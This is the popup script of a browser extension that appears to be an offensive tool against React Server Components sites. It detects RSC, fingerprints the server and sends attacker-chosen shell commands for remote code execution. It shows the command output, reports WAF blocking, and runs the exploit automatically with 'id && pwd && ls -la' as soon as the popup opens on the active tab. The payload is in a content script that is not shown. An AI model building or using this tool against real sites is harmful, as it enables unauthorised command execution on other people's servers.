document.addEventListener('DOMContentLoaded', () => {
    const el = {
        passiveBadge: document.getElementById('passive-badge'),
        passiveList: document.getElementById('passive-list'),
        btnFinger: document.getElementById('btnFingerprint'),
        fingerResult: document.getElementById('fingerprint-result'),
        activeList: document.getElementById('active-list'),
        btnExploit: document.getElementById('btnExploit'),
        cmdInput: document.getElementById('cmdInput'),
        exploitStatus: document.getElementById('exploit-status'),
        exploitResult: document.getElementById('exploit-result'),
        rceOutput: document.getElementById('rce-output'),
        btnDetach: document.getElementById('btnDetach'),
        btnCopy: document.getElementById('btnCopy'),
        tabs: document.querySelectorAll('.tab-btn'),
        tabContents: document.querySelectorAll('.tab-content')
    };

    // helper: badge styling for passive state
    const setPassiveBadge = (state, label) => {
        const toneMap = {
            scanning: 'tone-warn',
            detected: 'tone-alert',
            safe: 'tone-ok',
            error: 'tone-err'
        };
        // Use new class .status-badge instead of .pixel-badge
        el.passiveBadge.className = `status-badge ${toneMap[state] || 'tone-warn'}`;
        el.passiveBadge.innerText = label;
    };

    // helper: button loading animation
    const setButtonLoading = (btn, isLoading, idleLabel, loadingLabel) => {
        btn.disabled = isLoading;
        btn.classList.toggle('is-loading', isLoading);
        btn.innerText = isLoading ? loadingLabel : idleLabel;
    };

    // helper: try to inject content script programmatically if not present
    const ensureContentScript = async (tabId) => {
        try {
            await chrome.scripting.executeScript({
                target: { tabId: tabId },
                files: ['content.js']
            });
            // Wait a bit for script to initialize
            await new Promise(r => setTimeout(r, 100));
            return true;
        } catch (e) {
            console.warn('Could not inject content script:', e.message);
            return false;
        }
    };

    // helper: wrap chrome.tabs.sendMessage with timeout, error guard, and auto-injection
    const sendMessageSafe = async (tabId, payload, timeout = 10000) => {
        return new Promise(async (resolve) => {
            let settled = false;
            const timer = setTimeout(() => {
                if (settled) return;
                settled = true;
                resolve({ __timeout: true });
            }, timeout);

            const trySend = () => {
                chrome.tabs.sendMessage(tabId, payload, (res) => {
                    if (settled) return;
                    settled = true;
                    clearTimeout(timer);

                    if (chrome.runtime.lastError) {
                        resolve({ __error: chrome.runtime.lastError.message });
                    } else {
                        resolve(res);
                    }
                });
            };

            // First attempt
            chrome.tabs.sendMessage(tabId, payload, async (res) => {
                if (settled) return;
                
                if (chrome.runtime.lastError) {
                    // Content script might not be injected, try to inject it
                    const injected = await ensureContentScript(tabId);
                    if (injected && !settled) {
                        // Retry after injection
                        trySend();
                    } else if (!settled) {
                        settled = true;
                        clearTimeout(timer);
                        resolve({ __error: chrome.runtime.lastError.message });
                    }
                } else {
                    settled = true;
                    clearTimeout(timer);
                    resolve(res);
                }
            });
        });
    };

    // Parse URL params to get saved tabId (for detached mode)
    const urlParams = new URLSearchParams(window.location.search);
    const isDetached = urlParams.has('mode') && urlParams.get('mode') === 'detached';
    const savedTabId = urlParams.get('tabId') ? parseInt(urlParams.get('tabId'), 10) : null;

    if (isDetached) {
        el.btnDetach.style.display = 'none';
        document.body.classList.add('is-detached');
    }

    // --- 独立窗口逻辑 ---
    // Store the detached window ID in chrome.storage.local for singleton check
    el.btnDetach.addEventListener('click', async () => {
        // Check if a detached window already exists
        const stored = await chrome.storage.local.get('detachedWindowId');
        
        if (stored.detachedWindowId) {
            try {
                // Try to focus the existing window
                const existingWindow = await chrome.windows.get(stored.detachedWindowId);
                if (existingWindow) {
                    await chrome.windows.update(stored.detachedWindowId, { focused: true });
                    window.close();
                    return;
                }
            } catch (e) {
                // Window doesn't exist anymore, clear the stored ID
                await chrome.storage.local.remove('detachedWindowId');
            }
        }

        // Get current tab first, then pass tabId to the detached window
        chrome.tabs.query({active: true, currentWindow: true}, async (tabs) => {
            const currentTabId = tabs[0]?.id;
            const newWindow = await chrome.windows.create({
                url: `popup.html?mode=detached&tabId=${currentTabId}`,
                type: "popup",
                width: 550,
                height: 650
            });
            // Store the new window ID
            await chrome.storage.local.set({ detachedWindowId: newWindow.id });
            window.close();
        });
    });

    // --- Tab 切换逻辑 ---
    el.tabs.forEach(btn => {
        btn.addEventListener('click', () => {
            // Remove active class from all tabs and contents
            el.tabs.forEach(b => b.classList.remove('active'));
            el.tabContents.forEach(c => c.classList.remove('active'));

            // Add active class to clicked tab
            btn.classList.add('active');
            
            // Show corresponding content
            const targetId = btn.getAttribute('data-tab');
            document.getElementById(targetId).classList.add('active');
        });
    });

    // --- Copy Button Logic ---
    el.btnCopy.addEventListener('click', () => {
        const text = el.rceOutput.innerText;
        if (!text) return;

        navigator.clipboard.writeText(text).then(() => {
            const originalText = el.btnCopy.innerText;
            el.btnCopy.innerText = "COPIED!";
            el.btnCopy.style.color = "#5efcbf";
            setTimeout(() => {
                el.btnCopy.innerText = originalText;
                el.btnCopy.style.color = "";
            }, 2000);
        });
    });

    // 1. 获取当前 Tab（在独立窗口模式下使用 savedTabId）
    const getTargetTabId = async () => {
        if (isDetached && savedTabId) {
            return savedTabId;
        }
        return new Promise((resolve) => {
            chrome.tabs.query({active: true, currentWindow: true}, (tabs) => {
                resolve(tabs[0]?.id);
            });
        });
    };

    getTargetTabId().then((tabId) => {
        if (!tabId) {
            setPassiveBadge('error', 'NO TAB');
            el.passiveList.innerHTML = `<li>Could not find target tab</li>`;
            return;
        }
        
        // --- 初始化：被动扫描 ---
        sendMessageSafe(tabId, {action: "get_passive"}).then((res) => {
            if(res && res.__error) {
                setPassiveBadge('error', 'NO SCRIPT');
                el.passiveList.innerHTML = `<li>${res.__error}</li>`;
                return;
            }
            if(!res) {
                setPassiveBadge('error', 'TIMEOUT');
                el.passiveList.innerHTML = "<li>Please refresh page</li>";
                return;
            }
            if(res.isRSC) {
                setPassiveBadge('detected', 'DETECTED');
            } else {
                setPassiveBadge('safe', 'SAFE');
            }
            
            el.passiveList.innerHTML = "";
            if(res.details.length === 0) el.passiveList.innerHTML = "<li>No patterns found</li>";
            res.details.forEach(d => {
                const li = document.createElement('li');
                li.innerText = d;
                li.style.color = "#c0392b";
                el.passiveList.appendChild(li);
            });
        });

        // --- 交互：主动指纹 ---
        el.btnFinger.addEventListener('click', () => {
            setButtonLoading(el.btnFinger, true, "Start Probe", "Scanning...");
            el.fingerResult.style.display = 'none';

            sendMessageSafe(tabId, {action: "run_fingerprint"}).then((res) => {
                setButtonLoading(el.btnFinger, false, "Start Probe", "Scanning...");
                el.fingerResult.style.display = 'block';
                el.activeList.innerHTML = "";

                if(res && res.__timeout) {
                    el.activeList.innerHTML = "<li style='color:#ff5f6d'>Timeout waiting for content script</li>";
                    return;
                }
                if(res && res.__error) {
                    el.activeList.innerHTML = `<li style='color:#ff5f6d'>${res.__error}</li>`;
                    return;
                }

                if(res && res.detected) {
                    res.details.forEach(d => {
                        const li = document.createElement('li');
                        li.innerText = d;
                        li.style.color = "#ff2fb3";
                        li.style.fontWeight = "bold";
                        el.activeList.appendChild(li);
                    });
                } else {
                    el.activeList.innerHTML = "<li style='color:#00f5d4'>No Active RSC Response</li>";
                }
            });
        });

        // --- 交互：RCE 利用 ---
        // Default command for initial testing - simpler command to verify RCE works
        const DEFAULT_CMD = 'id && pwd && ls -la';
        el.cmdInput.value = DEFAULT_CMD;

        // Reusable exploit function
        const runExploit = (cmd) => {
            const targetCmd = cmd || DEFAULT_CMD;
            setButtonLoading(el.btnExploit, true, "EXEC", "EXEC...");
            el.exploitStatus.style.display = 'block';
            el.exploitResult.classList.remove('is-visible');
            el.rceOutput.className = 'console-out'; // Reset style

            sendMessageSafe(tabId, {action: "run_exploit", cmd: targetCmd}).then((res) => {
                setButtonLoading(el.btnExploit, false, "EXEC", "EXEC...");
                el.exploitStatus.style.display = 'none';
                el.exploitResult.classList.add('is-visible');

                if(res && res.__timeout) {
                    el.rceOutput.style.color = "#ff5f6d";
                    el.rceOutput.innerText = "[-] No response from content script (timeout).";
                    return;
                }
                if(res && res.__error) {
                    el.rceOutput.style.color = "#ff5f6d";
                    el.rceOutput.innerText = `[-] Failed to reach page script: ${res.__error}`;
                    return;
                }

                if(res && res.success) {
                    el.rceOutput.style.color = "#5efcbf"; // neon success
                    let out = `[+] Command: ${targetCmd}\n[+] Output:\n${res.output}`;
                    // Debug: show raw base64 if output looks wrong
                    if(res.rawBase64 && (res.output.length < 10 || /[\uFFFD]/.test(res.output))) {
                        out += `\n\n[DEBUG] Raw Base64: ${res.rawBase64}`;
                    }
                    if(res.waf) out += `\n\n[!] Warning: WAF Detected (${res.waf}) - Payload might be filtered, but response came through.`;
                    el.rceOutput.innerText = out;
                    // Alert badge on success
                    chrome.runtime.sendMessage({ action: "update_badge" });
                } else {
                    el.rceOutput.style.color = "#ff5f6d"; // alert red
                    // Enhanced debug output
                    let debugInfo = `[-] ${res ? res.msg : "Unknown Error"}`;
                    
                    if(res && res.waf) {
                        debugInfo = `[!] BLOCKED BY WAF: ${res.waf}\n` + debugInfo;
                    }

                    if(res && res.httpStatus) {
                        debugInfo += `\n\n[DEBUG] HTTP Status: ${res.httpStatus} ${res.httpStatusText}`;
                    }
                    if(res && res.fullResponse) {
                        debugInfo += `\n\n[DEBUG] Server Response:\n${res.fullResponse}`;
                    }
                    el.rceOutput.innerText = debugInfo;
                }
            });
        };

        // Bind button click
        el.btnExploit.addEventListener('click', () => {
            runExploit(el.cmdInput.value);
        });

        // Auto-execute exploit on popup load
        runExploit(DEFAULT_CMD);
    });
});